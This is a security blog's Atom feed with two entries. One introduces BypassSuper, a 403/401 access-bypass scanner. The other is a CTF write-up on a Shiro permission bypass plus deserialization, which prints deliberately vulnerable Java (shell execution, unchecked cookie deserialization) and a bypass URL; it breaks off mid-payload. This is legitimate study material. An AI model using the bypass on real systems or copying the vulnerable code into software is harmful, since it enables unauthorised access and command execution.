<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>像清水一般清澈透明</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://summersec.github.io/"/>
  <updated>2021-01-05T08:51:10.666Z</updated>
  <id>https://summersec.github.io/</id>
  
  <author>
    <name>Samny</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BypassSuper使用介绍说明</title>
    <link href="https://summersec.github.io/2021/02/05/BypassSuper%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"/>
    <id>https://summersec.github.io/2021/02/05/BypassSuper%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</id>
    <published>2021-02-05T00:22:16.000Z</published>
    <updated>2021-01-05T08:51:10.666Z</updated>
    
    <content type="html"><![CDATA[<h1 align="center">BypassSuper</h1><h3 align="center">一款针对403/401页面进行快速、高效尝试Bypass的扫描工具</h3> <p align="center">    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="BypassSuper" src="https://img.shields.io/badge/python-3.X-blueviolet"></a>    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="BypassSuper" src="https://img.shields.io/badge/Bypass-Super-green"></a>    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Forks" src="https://img.shields.io/github/forks/SummerSec/BypassSuper"></a>     <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Release" src="https://img.shields.io/github/release/SummerSec/BypassSuper.svg"></a>  <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Stars" src="https://img.shields.io/github/stars/SummerSec/BypassSuper.svg?style=social&label=Stars"></a>     <a href="https://github.com/SummerSec" target="_blank" rel="noopener"><img alt="Follower" src="https://img.shields.io/github/followers/SummerSec.svg?style=social&label=Follow"></a>    <a href="https://twitter.com/SecSummers" target="_blank" rel="noopener"><img alt="SecSummers" src="https://img.shields.io/twitter/follow/SecSummers.svg"></a>    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://visitor-badge.laobi.icu" target="_blank" rel="noopener"><rect fill="rgba(0,0,0,0)" height="20" width="49.6"></rect></a>    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://visitor-badge.laobi.icu" target="_blank" rel="noopener"><rect fill="rgba(0,0,0,0)" height="20" width="17.0" x="49.6"></rect></a>    </p><p><img src="https://visitor-badge.laobi.icu/badge?page_id=SummerSec.BypassSuper" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                ______                            _____</span><br><span class="line">                | ___ \                          &#x2F;  ___|</span><br><span class="line">                | |_&#x2F; &#x2F;_   _ _ __   __ _ ___ ___ \ &#96;--. _   _ _ __   ___ _ __</span><br><span class="line">                | ___ \ | | | &#39;_ \ &#x2F; _&#96; &#x2F; __&#x2F; __| &#96;--. \ | | | &#39;_ \ &#x2F; _ \ &#39;__|</span><br><span class="line">                | |_&#x2F; &#x2F; |_| | |_) | (_| \__ \__ \&#x2F;\__&#x2F; &#x2F; |_| | |_) |  __&#x2F; |</span><br><span class="line">                \____&#x2F; \__, | .__&#x2F; \__,_|___&#x2F;___&#x2F;\____&#x2F; \__,_| .__&#x2F; \___|_|</span><br><span class="line">                        __&#x2F; | |                              | |</span><br><span class="line">                       |___&#x2F;|_|                              |_|</span><br><span class="line">                    author: summersec</span><br><span class="line">                    version: 1.0</span><br><span class="line">                    Github: https:&#x2F;&#x2F;github.com&#x2F;SummerSec&#x2F;BypassSuper</span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure><h2 id="👮🏻‍♀️-免责声明"><a href="#👮🏻‍♀️-免责声明" class="headerlink" title="👮🏻‍♀️ 免责声明"></a>👮🏻‍♀️ 免责声明</h2><p>&emsp;&emsp; 由于传播、利用BypassSuper工具（下简称本工具）提供的检测功能而造成的<strong>任何直接或者间接的后果及损失</strong>，均由使用者本人负责，开发者本人<strong>不为此承担任何责任</strong>。</p><p>&emsp;&emsp; 本工具会根据使用者检测结果<strong>自动生成</strong>扫描结果报告，本报告内容及其他衍生内容均<strong>不能代表</strong>本人的立场及观点。</p><p>&emsp;&emsp; 请在使用本工具时遵循使用者以及目标系统所在国当地的<strong>相关法律法规</strong>，一切<strong>未授权测试均是不被允许的</strong>。若出现相关违法行为，我们将<strong>保留追究</strong>您法律责任的权利，并<strong>全力配合</strong>相关机构展开调查。</p><h2 id="dragon-来龙去脉"><a href="#dragon-来龙去脉" class="headerlink" title=":dragon:来龙去脉"></a>:dragon:来龙去脉</h2><p>&emsp;&emsp; 在某群里看到大佬发了个这个项目<a href="https://github.com/sting8k/BurpSuite_403Bypasser" target="_blank" rel="noopener">BurpSuite_403Bypasser</a>，然后看了一眼这个具体实现功能。因为在此之前在推特上看到国际友人发过类似的tips，当时就挺感兴趣的。但找了一圈并没有发现有什么现成的扫描器或者burp插件，当时是不了了之。这个项目发现之后，我第一时间就去看了一眼源代码，输出日志，发生很多payload和内容开发者是理解错的，或者是姿势不对。当然我发现之后，我开始动手在此源码上开始我的修改之路。截至本文发布时间为止，也有人发现这个问题，详情参考：<a href="https://github.com/sting8k/BurpSuite_403Bypasser/issues/4" target="_blank" rel="noopener">https://github.com/sting8k/BurpSuite_403Bypasser/issues/4</a></p><hr><h2 id="zap-Installation"><a href="#zap-Installation" class="headerlink" title=":zap: Installation"></a>:zap: Installation</h2><h3 id="BypassSuper-Burp"><a href="#BypassSuper-Burp" class="headerlink" title="BypassSuper-Burp"></a>BypassSuper-Burp</h3><p>&emsp;&emsp; <code>BurpSuite -&gt; Extender -&gt; Extensions -&gt; Add -&gt; Extension Type: Python -&gt; Select file: BypassSuper-Burp.py -&gt; Next till Fininsh</code></p><hr><h3 id="BypassSuper"><a href="#BypassSuper" class="headerlink" title="BypassSuper"></a>BypassSuper</h3><p>&emsp;&emsp; <code>pip3 install -r requirements.txt  --&gt; python3 BypassSuper.py -h</code></p><hr><h2 id="clap-参数介绍"><a href="#clap-参数介绍" class="headerlink" title=":clap: 参数介绍"></a>:clap: 参数介绍</h2><p>&emsp;&emsp; 您可以使用<code>python3 BypassSuper.py [options]</code>命令来运行本工具，<code>options</code>内容表述如下：</p><ul><li><p>-h（–help）</p><p>帮助命令，无需附加参数，查看本工具支持的全部参数及其对应简介；</p></li><li><p>-u （–url）<br>要扫描的网站网址路径，为必填选项之一，例如：<code>-u https://www.baidu.com</code>；</p><ul><li>-f （–file）<br>要扫描的网站网址路径文件，为必填选项之一，例如：<code>-f target.txt</code>；</li><li>-t （–threads）<br>扫描线程数量，为选填选项，配合-f参数使用，要求必须<code>target数量大于线程数量（默认20）</code>不然无法执行，例如：<code>-f target.txt -t 20</code></li></ul></li></ul><hr><h2 id="clapper-Screenshot"><a href="#clapper-Screenshot" class="headerlink" title=":clapper:Screenshot"></a>:clapper:Screenshot</h2><p><img src="https://img-blog.csdnimg.cn/20201207095047803.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 安装完成后自动扫描，在两个地方可以查看到扫描结果。第一个：在target里面，设置过滤器全部显示或者显示4xx。<br><img src="https://img-blog.csdnimg.cn/20201206225513435.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201207094215278.png" alt="两个"></p><p>&emsp;&emsp;  第二个地方在仪表盘<br><img src="https://img-blog.csdnimg.cn/20201207094338881.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 在插件拓展里面可以的UI可以查看扫描过程（建议直接输出到文件方便查看，UI里面只能查看部分，会被覆盖）。<br><img src="https://img-blog.csdnimg.cn/20201207094526995.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201207095902133.png" alt="在这里插入图片描述"></p><hr><h2 id="memo-TODO"><a href="#memo-TODO" class="headerlink" title=":memo: TODO"></a>:memo: TODO</h2><ul><li><input disabled type="checkbox"> 添加参数Bypass规则</li><li><input disabled type="checkbox"> 重构代码，目前所有源码都在一个文件中，太杂了</li><li><input disabled type="checkbox"> 自动扫描网页中的api接口实现BypassSuper中的“JSFinder”</li><li><input disabled type="checkbox"> 目录爆破，配合JSFinder</li><li><input disabled type="checkbox"> 自动爬取网页实现爬虫功能发现更多页面和接口</li></ul><hr><h2 id="📝-意见交流"><a href="#📝-意见交流" class="headerlink" title="📝 意见交流"></a>📝 意见交流</h2><hr><p>&emsp;&emsp; 您可以直接在GIthub仓库中提交ISSUE：<a href="https://github.com/SummerSec/BypassSuper/issues" target="_blank" rel="noopener">https://github.com/SummerSec/BypassSuper</a>亦或者发送邮件到summersec[@]qq.com</p><h2 id="hotsprings-已知问题"><a href="#hotsprings-已知问题" class="headerlink" title=":hotsprings:已知问题"></a>:hotsprings:已知问题</h2><ul><li><a href="https://github.com/SummerSec/BypassSuper/issues/3" target="_blank" rel="noopener">Exception: local variable ‘req’ referenced before assignment此问题是主机设置全局代理问题，目前没有添加代理功能。</a> 解决办法：<a href="https://github.com/SummerSec/BypassSuper/issues/3" target="_blank" rel="noopener">关闭全局代理</a><br><img src="https://img-blog.csdnimg.cn/20201207100058886.png" alt></li><li><a href="https://github.com/SummerSec/BypassSuper/issues/2" target="_blank" rel="noopener">结果csv文件中文乱码并且格式不对。</a><a href="https://github.com/SummerSec/BypassSuper/issues/2" target="_blank" rel="noopener">解决办法</a></li></ul><hr><h2 id="book-References"><a href="#book-References" class="headerlink" title=":book: References"></a>:book: References</h2><ul><li><p><a href="https://twitter.com/iam_j0ker/status/1324354024657711106?s=20" target="_blank" rel="noopener">https://twitter.com/iam_j0ker/status/1324354024657711106?s=20</a></p></li><li><p><a href="https://twitter.com/jae_hak99/status/1297556269960540161?s=20" target="_blank" rel="noopener">https://twitter.com/jae_hak99/status/1297556269960540161?s=20</a></p></li><li><p><a href="https://twitter.com/SalahHasoneh1/status/1296572143141031945" target="_blank" rel="noopener">https://twitter.com/SalahHasoneh1/status/1296572143141031945</a></p></li><li><p><a href="https://twitter.com/infosecsanyam/status/1331146922011324417" target="_blank" rel="noopener">https://twitter.com/infosecsanyam/status/1331146922011324417</a></p></li><li><p><a href="https://twitter.com/i_hack_everyone/status/1332027600726753280" target="_blank" rel="noopener">https://twitter.com/i_hack_everyone/status/1332027600726753280</a></p></li><li><p><a href="https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70" target="_blank" rel="noopener">https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70</a></p></li><li><p><a href="https://twitter.com/jae_hak99/status/1333811754745249792" target="_blank" rel="noopener">https://twitter.com/jae_hak99/status/1333811754745249792</a></p></li><li><p><a href="https://twitter.com/h4x0r_dz/status/1317218511937261570" target="_blank" rel="noopener">https://twitter.com/h4x0r_dz/status/1317218511937261570</a></p></li><li><p><a href="https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md" target="_blank" rel="noopener">https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 align=&quot;center&quot;&gt;BypassSuper&lt;/h1&gt;
&lt;h3 align=&quot;center&quot;&gt;一款针对403/401页面进行快速、高效尝试Bypass的扫描工具&lt;/h3&gt;
 &lt;p align=&quot;center&quot;&gt;
    &lt;a href=&quot;https://githu
      
    
    </summary>
    
    
      <category term="工具" scheme="https://summersec.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="未授权 401 403" scheme="https://summersec.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83-401-403/"/>
    
  </entry>
  
  <entry>
    <title>一道shiro反序列化题目引发的思考</title>
    <link href="https://summersec.github.io/2021/01/05/%E4%B8%80%E9%81%93shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://summersec.github.io/2021/01/05/%E4%B8%80%E9%81%93shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2021-01-05T00:22:16.000Z</published>
    <updated>2021-01-05T08:32:07.904Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 这是某银行的内部的一个CTF比赛，受邀参加。题目三个关键词<code>权限绕过</code>、<code>shiro</code>、<code>反序列化</code>，题目源码已经被修改，但考察本质没有，题目源码会上传到<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>。</p><hr><h1 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h1><ul><li>xray测试shiro的key</li><li>dirsearch跑目录</li><li>sqlmap测试登陆框是否存在sql注入</li></ul><hr><h1 id="白盒代码审计"><a href="#白盒代码审计" class="headerlink" title="白盒代码审计"></a>白盒代码审计</h1><h2 id="源码初步分析"><a href="#源码初步分析" class="headerlink" title="源码初步分析"></a>源码初步分析</h2><ul><li>版本 shiro == 1.5.3（不存在remember反序列化漏洞，但存在CVE-2020-13933权限绕过漏洞）<br><img src="https://img-blog.csdnimg.cn/20210102135348640.png" alt="在这里插入图片描述"></li></ul><hr><ul><li>shiro验证通过Realm的方式判断用户是否合法，此处重写<code>doGetAuthorizationInfo</code>方法，账户名<code>admin</code>（可能有用）。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        String username = (String)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"admin"</span>.equals(username)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnknownAccountException(<span class="string">"unkown user"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SimpleAuthenticationInfo(username, UUID.randomUUID().toString().replaceAll(<span class="string">"-"</span>, <span class="string">""</span>), getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><ul><li>访问控制权限，可能看到<code>index</code>、<code>dologin</code>存在访问权限。<blockquote><pre><code>* anon：匿名用户可访问* authc：认证用户可访问* user：使用rememberMe可访问* perms：对应权限可访问* role：对应角色权限可访问</code></pre></blockquote></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function">ShiroFilterFactoryBean <span class="title">shiroFilterFactoryBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ShiroFilterFactoryBean bean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line">    bean.setSecurityManager(<span class="keyword">this</span>.securityManager());</span><br><span class="line">    bean.setLoginUrl(<span class="string">"/login"</span>);</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line">    map.put(<span class="string">"/doLogin"</span>, <span class="string">"anon"</span>);</span><br><span class="line">    map.put(<span class="string">"/index/*"</span>, <span class="string">"authc"</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><ul><li><code>SQL注入？</code>第一眼反应感觉可能存在注入漏洞或者是XSS但又想到是CTF比赛，应该是不会考察XSS，所以觉得是SQL注入漏洞，然后用SQLMAP尝试一波注入绕过后，没有发现SQL注入漏洞。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">filter</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        String[] keyWord = <span class="keyword">new</span> String[]&#123;<span class="string">"'"</span>, <span class="string">"\""</span>, <span class="string">"select"</span>, <span class="string">"union"</span>, <span class="string">"/;"</span>, <span class="string">"/%3b"</span>&#125;;</span><br><span class="line">        String[] var3 = keyWord;</span><br><span class="line">        <span class="keyword">int</span> var4 = keyWord.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            String i = var3[var5];</span><br><span class="line">            param = param.replaceAll(i, <span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><ul><li>远程命令执行？翻遍代码发现调用<code>exeCmd</code>方法只有<code>LogHandler</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exeCmd</span><span class="params">(String commandStr)</span> </span>&#123;</span><br><span class="line">        BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">        String OS = System.getProperty(<span class="string">"os.name"</span>).toLowerCase();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process p = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (OS.startsWith(<span class="string">"win"</span>))&#123;</span><br><span class="line">                p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>, <span class="string">"/c"</span>, commandStr&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, commandStr&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">"\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h1><ul><li>根据获取的账号<code>admin</code>尝试爆破（无果）</li><li>sql注入再次尝试根据前面过滤掉参数进行bypass（无果），后期发现根本没有数据库链接操作，不可能存在sql注入。</li><li>根据获取的shiro版本可知，没有shiro反序列化漏洞但有权限绕过（成功）。</li></ul><p>&emsp;&emsp; 目前为止只能根据页面知道，该页面是一个<code>访问日志</code>展示页面。<br> <img src="https://img-blog.csdnimg.cn/20210104152919888.png" alt="在这里插入图片描述"></p><hr><h1 id="源码深度刨析"><a href="#源码深度刨析" class="headerlink" title="源码深度刨析"></a>源码深度刨析</h1><h2 id="深度分析"><a href="#深度分析" class="headerlink" title="深度分析"></a>深度分析</h2><p>&emsp;&emsp; Javaweb题目当然还是得从web页面分析，看源码分析一共就两个类访问控制器是处理web请求的。</p><ul><li><code>IndexController</code>处理登录前后页面</li><li><code>LoginController</code>处理登录请求页面<br>&emsp;&emsp; 前面分析到没有数据库，在源码也没发现登录的账号和密码故不用考虑 <code>LoginController</code>类，深度分析<code>IndexController</code>类发现该类存在反序列化操作。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(&#123;<span class="string">"/index/&#123;name&#125;"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response, @PathVariable String name)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line">        <span class="keyword">boolean</span> exist = <span class="keyword">false</span>;</span><br><span class="line">        Cookie cookie = <span class="keyword">null</span>;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Cookie[] var8 = cookies;</span><br><span class="line">            <span class="keyword">int</span> var9 = cookies.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var10 = <span class="number">0</span>; var10 &lt; var9; ++var10) &#123;</span><br><span class="line">                Cookie c = var8[var10];</span><br><span class="line">                <span class="comment">//判断cookie中是否存在hacker字段</span></span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(<span class="string">"hacker"</span>)) &#123;</span><br><span class="line">                    exist = <span class="keyword">true</span>;</span><br><span class="line">                    cookie = c;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 存在hacker字段，执行反序列化操作</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (exist) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.base64Decode(cookie.getValue());</span><br><span class="line">            <span class="comment">//反序列化操作点</span></span><br><span class="line">            user = (User)Tools.deserialize(bytes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 没有hacker字段，添加一个并设置其值</span></span><br><span class="line">            user = <span class="keyword">new</span> User();</span><br><span class="line">            user.setID(<span class="number">1</span>);</span><br><span class="line">            user.setUserName(name);</span><br><span class="line">            cookie = <span class="keyword">new</span> Cookie(<span class="string">"hacker"</span>, Tools.base64Encode(Tools.serialize(user)));</span><br><span class="line">            response.addCookie(cookie);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 添加值到前端页面</span></span><br><span class="line">        request.setAttribute(<span class="string">"hacker"</span>, user);</span><br><span class="line">        request.setAttribute(<span class="string">"logs"</span>, <span class="keyword">new</span> LogHandler());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>前端源码<br><img src="https://img-blog.csdnimg.cn/20210104152954385.png" alt="在这里插入图片描述"></li><li><code>存在反序列化点，下一步肯定构造反序列化请求，但如何构造反序列化请求呢？</code>前文提及到调用<code>exeCmd</code>方法只有<code>LogHandler</code>类。分析该类，两个方法都调用<code>exeCmd</code>执行命令。<code>invoke</code>方法里面调用的<code>exeCmd</code>是执行<code>wirteLog</code>命令，而<code>toString</code>方法里面调用<code>exeCmd</code>是执行<code>readLog</code>命令。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogHandler</span> <span class="keyword">extends</span> <span class="title">HashSet</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">private</span> String readLog = <span class="string">"tail  accessLog.txt"</span>;</span><br><span class="line">    <span class="keyword">private</span> String writeLog = <span class="string">"echo /test &gt;&gt; accessLog.txt"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogHandler</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 请求url路径写入访问日志</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Tools.exeCmd(<span class="keyword">this</span>.writeLog.replaceAll(<span class="string">"/test"</span>, (String)args[<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.target, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 读取日志返回结果</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Tools.exeCmd(<span class="keyword">this</span>.readLog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结下目前为止所有的信息点：</p><ol><li>存在权限绕过，URL：<code>index/%3b/admin</code>(/%3b可以是<code>/&#39;/</code>, <code>select</code>, <code>union</code>, <code>/;</code>之一)</li><li>存在反序列化点<code>IndexController#index</code>，构造请求<code>cookie</code>一定要有<code>hacker</code>字段。</li><li><code>index/admin</code>是访问日志</li><li>反序列化执行的点在<code>LogHandler</code>其中的两个方法</li></ol><hr><h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>下面两端代码分别是通过反射调用<code>invoke</code>和<code>toString</code>方法达到执行命令目的，对比一下很明显<code>toString</code>方法更加的简单质朴。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span 